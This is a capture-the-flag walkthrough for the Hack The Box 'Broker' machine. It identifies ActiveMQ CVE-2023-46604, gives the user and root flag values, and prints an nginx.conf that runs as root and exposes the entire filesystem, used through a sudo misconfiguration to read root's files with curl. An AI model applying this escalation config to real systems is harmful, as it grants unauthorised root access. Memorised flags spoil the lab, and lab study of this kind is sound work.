## Guided:
**Q:** Which open TCP port is running the ActiveMQ service?<br>
**A:** 61616<br>
>`nmap -p- -sV -sC <IP>`

**Q:** What is the version of the ActiveMQ service running on the box?<br>
**A:** 5.15.15

**Q:** What is the 2023 CVE-ID for a remote code execution vulnerability in the ActiveMQ version running on Broker?<br>
**A:** CVE-2023-46604<br>
>A quick search in google for ActiveMQ will show known vulns,<br> msfconsole found it also.

**Q:** What user is the ActiveMQ service running as on Broker?<br>
**A:** activemq

**Q:** Submit the flag located in the activemq user's home directory.<br>
**A:** dcbe3e6670a649c8f04bec7180c04f90

**Q:** What is the full path of the binary that the activemq user can run as any other user with sudo?<br>
**A:** /usr/sbin/nginx<br>
> found via `sudo -l`

**Q:** Which nginx directive can be used to define allowed WebDAV methods?<br>
**A:** dav_methods<br>
>A quick google search will reveal

**Q:** Which HTTP method is used to write files via the WebDAV protocol?<br>
**A:** PUT

**Q:** Which flag is used to set a custom nginx configuration by specifying a file?<br>
**A:** -c <br>
>Note: Make sure to test it first with the flag "-t"

**Q:** Submit the flag located in the root user's home directory.<br>
**A:** 1c7373279ff8506fea6dc101fa2730e4
>from target shell >  `curl localhost:1233/root/root.txt`<br>
>Could of also make ssh key to login as root if needed.<br>


## Another note 
> since user can run as sudo nginx,<br>
> I had to update the config so it will run a server with root privs,<br>
> Ippsec walkthrough helped with edit the nginx.conf file,<br>
> The updated nginx.conf file:<br>
```bash
user root;
worker_processes auto;
pid /run/nginx2.pid;
include /etc/nginx/modules-enabled/*.conf;
events {
        worker_connections 768;
}
http {
	server {
		listen 1233;
		location / {
		root /;
		}

	}
}


